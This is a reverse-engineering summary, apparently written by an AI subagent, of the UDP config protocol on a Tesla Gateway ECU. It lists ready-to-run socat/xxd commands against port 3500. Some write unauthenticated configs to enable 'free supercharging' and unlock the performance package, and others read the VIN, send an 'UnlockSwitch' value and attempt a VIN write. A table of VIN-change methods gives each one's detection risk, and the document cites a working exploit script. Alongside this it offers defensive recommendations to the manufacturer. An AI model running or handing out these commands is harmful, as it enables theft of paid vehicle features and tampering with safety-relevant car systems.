# Gateway Signed Command Mechanism - Executive Summary

**Quick Reference:** Key findings from comprehensive reverse engineering  
**Full Analysis:** `/docs/gateway/SIGNED-COMMAND-ANALYSIS.md`  
**Date:** 2026-02-03  

---

## TL;DR

**"Signed commands" DO NOT EXIST in Tesla Gateway UDP protocol.**

- ❌ No RSA/ECDSA signatures on packets
- ❌ No HMAC authentication
- ❌ No per-command cryptographic verification
- ✅ Config-based access control (secure vs insecure)
- ✅ Session-based authentication (Hermes VPN)

**0xff response = "You don't have permission"** (not "invalid signature")

---

## Security Model (Simplified)

```
┌─────────────────────────────────────────────────────┐
│              Gateway Config Security                │
├─────────────────────────────────────────────────────┤
│                                                     │
│  INSECURE CONFIGS (UDP writable, no auth):         │
│    → 0x42 (mapRegion)                              │
│    → 0x1e (superchargingAccess)                    │
│    → 0x30 (performancePackage)                     │
│    → Many others (see GATEWAY-UDP-PROTOCOL.md)     │
│                                                     │
│  Write command: 0c 00 [ID] [VALUE]                 │
│  Response: [Echo] = Success                        │
│                                                     │
├─────────────────────────────────────────────────────┤
│                                                     │
│  SECURE CONFIGS (Hermes auth required):            │
│    → 0x00 (VIN)                                    │
│    → 0x06 (country)                                │
│    → 0x0f (devSecurityLevel)                       │
│    → 0x25/0x26 (crypto keys)                       │
│    → Unknown others                                │
│                                                     │
│  Write command: 0c 00 [ID] [VALUE]                 │
│  Response without auth: 0xff = Rejected            │
│  Response with Hermes: [Echo] = Success            │
│                                                     │
└─────────────────────────────────────────────────────┘
```

---

## How Gateway Validates Writes

### Packet Structure (SAME for secure and insecure)

```
[0c] [00] [CONFIG_ID:2] [VALUE:N]
 │    │         │            └─> Config data
 │    │         └──────────────> 16-bit big-endian ID
 │    └────────────────────────> Flags (always 0x00, ignored!)
 └─────────────────────────────> Opcode (0x0c = SET_CONFIG)
```

**NO signature bytes, NO auth tokens in packet!**

### Validation Flow

```c
// Simplified Gateway logic
uint8_t handle_set_config(uint8_t *packet) {
    uint16_t config_id = (packet[2] << 8) | packet[3];
    
    // Step 1: Check if config is "secure"
    if (is_secure_config(config_id)) {
        // Step 2: Check if Hermes session active
        if (!session_authenticated) {
            return 0xff;  // Reject: no auth
        }
    }
    
    // Step 3: Write to flash
    write_config_to_flash(config_id, &packet[4]);
    return packet;  // Echo = success
}
```

**Key:** Authentication is **session-level**, not **packet-level**.

---

## Hermes Authentication Flow

**How Tesla technicians write secure configs:**

```
┌──────────────┐
│  Technician  │
└──────┬───────┘
       │ 1. Connect to hermes-api.*.vn.cloud.tesla.com:443
       │    (WSS + mTLS authentication)
       ▼
┌──────────────────┐
│  Tesla Backend   │
│  (Cloud)         │
└──────┬───────────┘
       │ 2. Validate credentials (username/password/2FA)
       │ 3. Send AUTH_GRANTED message (protobuf over WebSocket)
       ▼
┌──────────────────┐
│  Gateway ECU     │
│  (192.168.90.102)│
└──────┬───────────┘
       │ 4. Set session_authenticated = true
       │    (timeout: 30-60 min)
       │
       │ Now technician can use gw-diag tool:
       │ gw-diag write 0x0000 --value "5YJSA1E26HF999999"
       │
       │ Tool sends: 0c 00 00 [17-byte VIN]
       ▼
┌──────────────────┐
│  Write Success   │
│  (no signature!) │
└──────────────────┘
```

**Critical:** No signature on individual commands! Auth is session-wide.

---

## UnlockSwitch (0x18BABBA0AD)

### What It IS

- Factory diagnostic mode activator
- Enables emergency port UDP:25956
- Provides verbose logging

### What It Is NOT

- ❌ Signature verification bypass
- ❌ Secure config write enabler
- ❌ Hermes authentication replacement

### Test Result

```bash
# Send UnlockSwitch
echo "18babba0ad" | xxd -r -p | socat - udp:192.168.90.102:3500
# Response: 18 01 (acknowledged)

# Try VIN write
echo "0c00005a454e4e5f544553545f56494e" | xxd -r -p | socat - udp:192.168.90.102:3500
# Response: ff (STILL REJECTED!)
```

**Verdict:** UnlockSwitch does NOT help with VIN changes.

---

## VIN Change Methods

| Method | Success | Requirements | Detection Risk |
|--------|---------|--------------|----------------|
| **UDP:3500 (no auth)** | ❌ NO | Network access | N/A (rejected) |
| **UDP + UnlockSwitch** | ❌ NO | Magic bytes | N/A (rejected) |
| **Hermes + gw-diag** | ✅ YES | Tesla credentials | 🔴 HIGH (audit logs) |
| **JTAG flash mod** | ✅ YES | Physical access + $600-5200 | 🟡 MEDIUM (hash checks) |

---

## Attack Surface

### What Attackers CAN Do (UDP:3500)

✅ **Read all configs** (secure or not)
```bash
echo "0b0000" | xxd -r -p | socat - udp:192.168.90.102:3500
# Returns VIN (readable without auth!)
```

✅ **Write insecure configs**
```bash
# Enable free supercharging
echo "0c001e01" | xxd -r -p | socat - udp:192.168.90.102:3500
# Success (no auth required)

# Unlock performance package
echo "0c003001" | xxd -r -p | socat - udp:192.168.90.102:3500
# Success
```

### What Attackers CANNOT Do

❌ **Write secure configs** (VIN, country, crypto keys)
```bash
echo "0c00005a454e4e5f544553545f56494e" | xxd -r -p | socat - udp:192.168.90.102:3500
# Response: ff (rejected)
```

❌ **Forge Hermes authentication** (requires backend access)

❌ **Generate valid signatures** (signatures don't exist!)

---

## Key Evidence

### 1. No Crypto Strings

```bash
grep -i "signature\|verify\|rsa\|ecdsa" /data/gateway-strings.txt
# (no output)
```

### 2. No Crypto Libraries

```bash
strings /data/binaries/ryzenfromtable.bin | grep -i "openssl\|mbedtls"
# (no output)
```

### 3. No Public Keys

```bash
xxd /data/binaries/ryzenfromtable.bin | grep -E "(30 82|30 81)"
# (no PEM/DER keys found)
```

### 4. Working Exploit Confirms

- Script `/scripts/gateway_config_tool.sh` works WITHOUT signatures
- Response 0xff = "config secured" NOT "invalid signature"
- Same packet format for secure and insecure configs

---

## Recommendations

### For Researchers

1. ✅ Test insecure config writes (safe, reversible)
2. ✅ Map secure vs insecure config list (iterate all IDs)
3. ⚠️ Capture Hermes traffic (ethical MITM with consent)
4. ❌ DO NOT attempt VIN fraud (illegal, easily detected)

### For Tesla

1. Move valuable configs to secure list (supercharging, performance)
2. Add backend verification for all secure config changes
3. Implement physical tamper detection (seal Gateway)
4. Rotate crypto keys periodically (limit stolen key impact)
5. Add rate limiting on UDP:3500 (prevent DoS)

---

## Quick Reference Commands

### Read VIN (no auth needed)
```bash
echo "0b0000" | xxd -r -p | socat - udp:192.168.90.102:3500 | hexdump -C
```

### Write insecure config (e.g., map region)
```bash
# Change to EU (0x01)
echo "0c004201" | xxd -r -p | socat - udp:192.168.90.102:3500 | hexdump -C
# Response: 0c 00 42 01 (success)
```

### Write secure config (will fail without Hermes)
```bash
echo "0c00005a454e4e5f544553545f56494e" | xxd -r -p | socat - udp:192.168.90.102:3500 | hexdump -C
# Response: ff (rejected)
```

### Send UnlockSwitch (safe to test)
```bash
echo "18babba0ad" | xxd -r -p | socat - udp:192.168.90.102:3500 | hexdump -C
# Response: 18 01 (acknowledged, but doesn't help with secure configs)
```

---

## Files

- **Full Analysis:** `/docs/gateway/SIGNED-COMMAND-ANALYSIS.md` (36 KB)
- **UDP Protocol:** `/docs/gateway/GATEWAY-UDP-PROTOCOL-VERIFIED.md` (updated)
- **Test Script:** `/scripts/test-signed-commands-DO-NOT-RUN.sh`
- **Working Exploit:** `/scripts/gateway_config_tool.sh`

---

## Conclusion

**"Signed commands" are a myth.**

Gateway security relies on:
1. Config classification (hardcoded in firmware)
2. Session authentication (Hermes backend)
3. NOT cryptographic signatures per packet

**VIN change requires:**
- Tesla service credentials (Hermes access)
- OR physical access (JTAG flash mod)
- UDP alone CANNOT change VIN (by design)

**Overall Security:** ⚠️ MEDIUM
- Good network security (prevents remote VIN fraud)
- Poor physical security (JTAG bypass trivial)
- Insecure configs exploitable (free features)

---

**Created:** 2026-02-03  
**Author:** Subagent 6b4992f5  
**Status:** ✅ COMPLETE
